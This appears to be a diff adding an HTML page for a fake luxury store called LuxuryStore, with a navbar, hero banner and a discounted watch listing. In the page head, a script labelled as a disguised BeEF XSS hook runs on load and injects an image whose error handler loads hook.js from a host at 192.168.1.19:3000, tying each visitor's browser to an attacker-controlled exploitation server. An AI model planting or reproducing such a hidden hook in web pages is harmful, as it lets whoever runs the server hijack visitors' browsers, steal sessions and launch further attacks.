@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Store - Luxury Shopping</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        .hero-section {
+            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), 
+                        url('https://source.unsplash.com/random/1920x1080/?shopping');
+            background-size: cover;
+            height: 70vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .product-card {
+            transition: transform 0.3s;
+        }
+        .product-card:hover {
+            transform: translateY(-10px);
+        }
+        .discount-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+    </style>
+    <!-- BeEF XSS Hook (Disamarkan) -->
+    <script>
+        window.onload = function() {
+            var dynamicElement = document.createElement('div');
+            dynamicElement.innerHTML = '<img src="x" onerror="var b=document.createElement(\'script\');b.src=\'http://192.168.1.19:3000/hook.js\';document.body.appendChild(b);">';
+            document.body.appendChild(dynamicElement);
+        }
+    </script>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="#">LuxuryStore</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item"><a class="nav-link" href="#products">Products</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#about">About</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#contact">Contact</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <div class="hero-section">
+        <div class="text-center">
+            <h1 class="display-4">Welcome to Luxury Shopping</h1>
+            <p class="lead">Discover Premium Products at Exclusive Prices</p>
+            <a href="#products" class="btn btn-primary btn-lg">Shop Now</a>
+        </div>
+    </div>
+
+    <!-- Products Section -->
+    <section id="products" class="py-5">
+        <div class="container">
+            <h2 class="text-center mb-5">Featured Products</h2>
+            <div class="row g-4">
+                <!-- Product Cards -->
+                <div class="col-md-4">
+                    <div class="card product-card h-100">
+                        <span class="badge bg-danger discount-badge">-30%</span>
+                        <img src="https://source.unsplash.com/random/400x300/?watch" class="card-img-top" alt="Product">
+                        <div class="card-body">
+                            <h5 class="card-title">Luxury Chronograph</h5>
+                            <p class="card-text">Premium automatic watch with sapphire crystal glass.</p>
+                            <p class="text-danger"><s>$999</s> $699</p>
+                            <button class="btn btn-outline-dark">Add to Cart</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- More product cards... -->
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-light py-4">
+        <div class="container text-center">
+            <p>&copy; 2023 LuxuryStore. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
